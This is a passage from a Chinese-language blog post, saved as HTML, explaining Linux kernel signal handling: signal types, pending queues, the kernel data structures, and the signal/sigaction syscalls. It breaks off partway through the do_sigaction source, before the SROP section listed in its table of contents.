<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="linux 中的信号处理与 SROP一、基本概念信号是事件发生时对进程的通知机制，其与中断类似，在到达时都会打断程序的正常执行流程。一个进程（若具有权限则）可以向另一个进程或向自身发送信号，其可以作为一种同步技术或进程间通信的原始形式。发往进程的诸多信号通常都源于内核，引发内核为进程产生信号的事件包括：    硬件异常： 如用户态的访问异常&#x2F;除零异常等，其首先都是由硬件捕获并通知内核的，再由内核通">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="linux 中的信号处理与 SROP一、基本概念信号是事件发生时对进程的通知机制，其与中断类似，在到达时都会打断程序的正常执行流程。一个进程（若具有权限则）可以向另一个进程或向自身发送信号，其可以作为一种同步技术或进程间通信的原始形式。发往进程的诸多信号通常都源于内核，引发内核为进程产生信号的事件包括：    硬件异常： 如用户态的访问异常&#x2F;除零异常等，其首先都是由硬件捕获并通知内核的，再由内核通">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/490870_8BR4T46PXSMS9WK.jpg">
<meta property="og:image" content="http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/490870_GP85QUMB8JX887Z.jpg">
<meta property="og:image" content="http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/490870_DCKHHZWXWTAYKXS.jpg">
<meta property="article:published_time" content="2022-03-07T03:32:45.183Z">
<meta property="article:modified_time" content="2022-03-07T03:50:20.293Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/490870_8BR4T46PXSMS9WK.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Hexo</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 6.0.0"></head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/gabithume">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2022/01/19/%E8%BF%99%E6%98%AF%E4%B8%AA%E6%94%B6%E8%97%8F%E5%A4%B9/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&text="><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&is_video=false&description="><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&name=&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#linux-%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E-SROP"><span class="toc-number">1.</span> <span class="toc-text">linux 中的信号处理与 SROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">一、基本概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E7%9A%84%E8%AE%BE%E7%BD%AE"><span class="toc-number">3.</span> <span class="toc-text">二、信号处理函数的设置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BF%A1%E5%8F%B7%E7%9A%84%E5%8F%91%E9%80%81"><span class="toc-number">4.</span> <span class="toc-text">三、信号的发送</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BF%A1%E5%8F%B7%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E7%AD%89%E5%BE%85"><span class="toc-number">5.</span> <span class="toc-text">四、信号的处理与等待</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 信号处理概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E7%9A%84%E6%97%B6%E6%9C%BA"><span class="toc-number">5.1.1.</span> <span class="toc-text">1. 信号处理的时机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E6%8F%8F%E8%BF%B0"><span class="toc-number">5.1.2.</span> <span class="toc-text">2. 信号处理流程描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%BE%E4%BE%8B"><span class="toc-number">5.1.3.</span> <span class="toc-text">3、信号处理举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-EL0-%E5%BC%82%E5%B8%B8%E8%BF%94%E5%9B%9E%E5%89%8D%E7%9A%84%E4%B8%AD%E6%96%AD%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%A4%84%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 EL0 异常返回前的中断检查与处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%AE%8C%E6%AF%95%E5%90%8E%E6%81%A2%E5%A4%8D%E7%94%A8%E6%88%B7%E6%80%81%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">5.3.</span> <span class="toc-text">4.3 中断处理函数执行完毕后恢复用户态上下文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%BE%E4%BE%8B"><span class="toc-number">5.4.</span> <span class="toc-text">4.4 内核线程信号处理举例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81SROP-%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text">五、SROP 原理与安全性分析</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Hexo</span>
      </span>
      
    <div class="postdate">
        <time datetime="2022-03-07T03:32:45.183Z" itemprop="datePublished">2022-03-07</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="linux-中的信号处理与-SROP"><a href="#linux-中的信号处理与-SROP" class="headerlink" title="linux 中的信号处理与 SROP"></a>linux 中的信号处理与 SROP</h1><h1 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h1><p>信号是事件发生时对进程的通知机制，其与中断类似，在到达时都会打断程序的正常执行流程。一个进程（若具有权限则）可以向另一个进程或向自身发送信号，其可以作为一种同步技术或进程间通信的原始形式。发往进程的诸多信号通常都源于内核，引发内核为进程产生信号的事件包括：</p>
<ul>
<li><p>  <strong>硬件异常：</strong> 如用户态的访问异常/除零异常等，其首先都是由硬件捕获并通知内核的，再由内核通过信号传递给用户态。</p>
</li>
<li><p>  <strong>用户输入的中断字符</strong>：如 ctrl-c， ctrl-z。</p>
</li>
<li><p>  <strong>软件事件的发生</strong>：如针对文件描述符的输出变为有效，终端大小调整，定时器到期，cpu 执行时间到期，子进程退出等。</p>
</li>
</ul>
<p>每个信号在系统中都有唯一的编码，其编号随着系统的不同而不同，故程序中应该总是使用符号名来代表这些信号。</p>
<p>信号分为标准信号和实时信号， <strong>在 linux 中编号 1~31 为标准信号，&gt; 31（ &lt;=64）的为实时信号</strong>。</p>
<p>  信号在产生后可能会经历一段时间才会真正被处理（到达），在此过程中信号则处于 pending（等待状态），<strong>在内核返回用户态时才会检查信号是否到来</strong>，故：</p>
<ul>
<li>  <strong>若进程向其他进程发送信号</strong>，则通常总要有一段（极短的）pending 的时间， 直到目标进程被调度到或目标进程正在运行时产生了 el0 异常。</li>
<li>  <strong>若进程向自身发送信号</strong>，则通常在如 kill 系统调用返回时此信号立即被处理。</li>
</ul>
<p><strong>有时为了确保一段代码不被打断，可以通过掩码来屏蔽部分信号，被屏蔽的信号会一直处于等待状态，直到解除屏蔽</strong>。</p>
<p>通过 /proc/pid/status 接口可以查看当前进程的信号:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 实现代码参考内核 ./fs/proc/array.c task_sig</span></span></span><br><span class="line">tangyuan@ubuntu:~/tests/namespace$ cat /proc/xxx/status</span><br><span class="line">......</span><br><span class="line">SigQ:   1/31451             ## 当前进程信号队列中总共收到了多少个信号</span><br><span class="line">SigPnd: 0000000000000000    ## 当前线程收到过哪些信号，SigPnd(signal pending) 是收到的信号掩码</span><br><span class="line">ShdPnd: 0000000000000200    ## 当前线程组共享队列中收到了哪些信号，ShdPnd(shared pending) 是共享队列中收到的掩码，这里 0x200 代表收到信号为 SIGUSR1</span><br><span class="line">SigBlk: 0000000000000a00    ## 当前线程阻塞的信号掩码，当前 SIGUSR1/2 信号均被阻塞</span><br><span class="line">SigIgn: 0000000000000000    ## 当前线程组忽略的信号，信号忽略是以线程组为单位的</span><br><span class="line">SigCgt: 0000000000000a00    ## 当前线程组捕获的信号，也就是自定义了信号处理函数的信号，当前 SIGUSR1/2 均自定义了信号处理函数</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>linux中各信号的定义可参考 [0], 这里需要注意的是：</p>
<ol>
<li><p>标准信号不排队，实时信号需排队处理</p>
<ul>
<li>  标准信号不做排队处理：即内核某线程/线程组若收到某个标准信号，则在其被处理前是不会再次在 pending 队列中加入同一个标准信号的。<strong>这意味着若一个标准信号多次到达，其信号处理函数有可能只被调用了一次</strong>。</li>
<li>  实时信号需要排队处理：即内核某线程/线程组若收到实时信号，则不论之前是否有收到过此信号，都会在 pending 队列新增此信号。<strong>这也意味着每发生一次实时信号其信号处理函数都会被调用一次</strong>。</li>
</ul>
</li>
<li><p>内核线程也可以接收信号<br>虽然信号处理是为用户进程设计的，但在 linux 中内核线程也是可以接受信号的。和用户进程不同的是：</p>
<ul>
<li>  内核线程中只可以确定要接受哪个信号，但不能为信号指定具体处理函数</li>
<li>  内核线程不会主动触发信号处理函数，若想要查看自身收到的信号，内核线程中需要使用循环来判断自身是否收到了信号 （默认的信号处理发生在内核返回到用户态, 内核线程不会触发此流程） </li>
<li>  内核线程可以指定其接受的某个信号只能由内核态发出，即其可以指定自身不接受用户态发送的信号。</li>
<li>  内核线程不接受 SIGKILL 信号</li>
</ul>
<p>内核线程的信号处理可以参考内核线程函数 <code>jffs2_garbage_collect_thread</code>.</p>
</li>
<li><p>init 进程不接受 SIGKILL/SIGSTOP 信号</p>
<p>见内核 <code>sig_task_ignored</code> 函数</p>
</li>
</ol>
<h1 id="二、信号处理函数的设置"><a href="#二、信号处理函数的设置" class="headerlink" title="二、信号处理函数的设置"></a>二、信号处理函数的设置</h1><p>从内核角度看，一个线程的信号可能保存在两个队列中：</p>
<ul>
<li>  一个是线程组共享的信号队列 （task_struct -&gt; signal -&gt; shared_pending） </li>
<li>  一个是线程自身私有的信号队列 （task_struct -&gt; pending） </li>
</ul>
<p>通常信号是发送到线程组共享的信号队列的，此队列中的信号被线程组中的任意线程处理（一次）即可，而在用户态看来则是一个信号可能被线程组中的任一线程处理。而通过如 tkill 系统调用也可以将信号直接发送给线程的私有信号队列，此时虽然线程组中所有线程的信号处理函数是同一个，但可以确保此信号只会由某个具体的线程来处理。在内核中信号相关的结构体定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task_struct 中信号相关字段</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* Signal handlers: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span>            *<span class="title">signal</span>;</span> <span class="comment">/* 指向线程组共享的信号描述信息的指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> __<span class="title">rcu</span>     *<span class="title">sighand</span>;</span> <span class="comment">/* 指向线程组共享的信号处理函数描述信息的指针 */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    线程私有的被阻塞信号结构体，sigset_t 是一个信号掩码，每个信号在其中占一个 bit 位，需要注意 block 和 ignore 不同：</span></span><br><span class="line"><span class="comment">        * 被设置为 ignore 后再接收到此信号则会被直接忽略，设置时若发现有已到达的 ignore 信号也会丢弃。</span></span><br><span class="line"><span class="comment">        * 被设置为 blocked 后再接收到此信号同样还需要加入到信号队列，只是此时不再向线程发送 TFI_SIGPENDING 到达信号了，后续 unblock 之后此信号还是会被处理的。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">sigset_t</span>            blocked; </span><br><span class="line">    <span class="keyword">sigset_t</span>            real_blocked;</span><br><span class="line">    <span class="keyword">sigset_t</span>            saved_sigmask;  <span class="comment">/* 在 sigsuspend 等函数等待信号期间临时保存之前的 block 掩码 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span>   <span class="title">pending</span>;</span>        <span class="comment">/* 线程私有的信号队列 */</span> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>       sas_ss_sp;      <span class="comment">/* 若线程有单独的信号栈则记录在这里 */</span></span><br><span class="line">    <span class="keyword">size_t</span>              sas_ss_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        sas_ss_flags;</span><br><span class="line">    ......</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 只记录部分相关结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>   <span class="title">thread_head</span>;</span>     <span class="comment">/* 指向线程组组长的 task_struct */</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span>  <span class="title">shared_pending</span>;</span>  <span class="comment">/* 线程组的共享信号队列 */</span> </span><br><span class="line">    <span class="comment">/* thread group exit support */</span></span><br><span class="line">    <span class="keyword">int</span>         group_exit_code;        <span class="comment">/* 整个线程组是因为哪个信号退出的，见 complete_signal */</span></span><br><span class="line">    <span class="keyword">int</span>         group_stop_count;       <span class="comment">/* thread group stop support, overloads group_exit_code too */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>       flags;           <span class="comment">/* see SIGNAL_* flags below */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pids</span>[<span class="title">PIDTYPE_MAX</span>];</span>      <span class="comment">/* 信号处理时有时会向进程组，会话发送信号，这里记录进程组和会话 pid 等相关信息 */</span></span><br><span class="line">    ......</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>      siglock;       </span><br><span class="line">    <span class="keyword">refcount_t</span>      count;              <span class="comment">/* 引用计数 */</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span>   signalfd_wqh;   <span class="comment">/* 等待此 signal 的 signalfd 队列，见 signalfd_read */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">k_sigaction</span> <span class="title">action</span>[_<span class="title">NSIG</span>];</span>   <span class="comment">/* 记录每个信号的信号处理函数等相关信息 */</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">k_sigaction</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span>......</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    信号处理函数指针,</span></span><br><span class="line"><span class="comment">        * 若为 0 (SIG_DFL) 则代表使用默认信号处理函数</span></span><br><span class="line"><span class="comment">        * 若为 1 (SIG_IGN) 则代表此信号被忽略</span></span><br><span class="line"><span class="comment">        * 若为 2 (SIG_KTHREAD) 则代表当前内核线程可以接受用户态/内核态向其发送此信号</span></span><br><span class="line"><span class="comment">        * 若为 3 (SIG_KTHREAD_KERNEL) 则代表当前内核线程只可以接受内核态向其发送此信号</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">__sighandler_t</span>  sa_handler;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  sa_flags;    <span class="comment">/* 某些信号会有一些细节控制 flag，如 SIGCHLD 可以指定 SA_NOCLDSTOP */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> sa_mask;           <span class="comment">/* 当当前信号正在处理时需屏蔽的其他信号，其可以用于防止信号处理函数被再次中断 */</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<p>各结构体关系如下图:</p>
<p><img src="./490870_8BR4T46PXSMS9WK.jpg"></p>
<p>linux 用户态可以通过 signal/sigaction 函数设置信号处理函数，二者系统调用接口如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE3</span>(</span><br><span class="line">    sigaction, </span><br><span class="line">    <span class="keyword">int</span>, sig, </span><br><span class="line">    <span class="keyword">const</span> struct old_sigaction __user *, </span><br><span class="line">    act, </span><br><span class="line">    struct old_sigaction __user *, </span><br><span class="line">    oact);</span><br><span class="line"></span><br><span class="line"><span class="built_in">SYSCALL_DEFINE2</span>(signal, <span class="keyword">int</span>, sig, <span class="keyword">__sighandler_t</span>, handler); </span><br></pre></td></tr></table></figure>


<p>二者最终均调用了 do_sigaction 函数，这里以简单的 <code>sys_signal</code> 函数为例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将当前线程组信号 sig 的处理函数设置为 handler, 并返回旧的信号处理函数指针 */</span></span><br><span class="line"><span class="built_in">SYSCALL_DEFINE2</span>(signal, <span class="keyword">int</span>, sig, <span class="keyword">__sighandler_t</span>, handler)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">k_sigaction</span> <span class="title">new_sa</span>, <span class="title">old_sa</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret; </span><br><span class="line">    new_sa.sa.sa_handler = handler;</span><br><span class="line">    <span class="comment">/* 构建一个 sigaction 结构体并指定用户态的信号处理函数 handler */</span></span><br><span class="line">    new_sa.sa.sa_flags = SA_ONESHOT | SA_NOMASK;        </span><br><span class="line">    <span class="comment">/* signal 函数默认是单次触发 */</span> </span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;new_sa.sa.sa_mask); <span class="comment">/* 清空/重置当前信号处理时的掩码 */</span> </span><br><span class="line">    <span class="comment">/* 设置当前线程组信号 sig 的处理函数，并返回此信号旧的处理函数指针; 若信号设置为被忽略则需删除已收到的所有此信号 */</span></span><br><span class="line">    ret = <span class="built_in">do_sigaction</span>(sig, &amp;new_sa, &amp;old_sa);  </span><br><span class="line">    <span class="keyword">return</span> ret ? ret : (<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_sa.sa.sa_handler; <span class="comment">/* 出错返回错误码，否则返回原有的 handler */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>do_sigaction</strong>:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此函数负责为当前线程组设置信号 sig 的信号处理函数（记录在 act 中），并通过 oact 返回之前的信号处理函数。如果 act 中指定信号 sig 会被忽略，那么会删除此线程组信号队列（包括线程组所有线程私有信号队列）中已经接受到的此信号。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_sigaction</span><span class="params">(<span class="keyword">int</span> sig, struct k_sigaction *act, struct k_sigaction *oact)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span> =</span> current, *t;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">k_sigaction</span> *<span class="title">k</span>;</span></span><br><span class="line">    <span class="keyword">sigset_t</span> 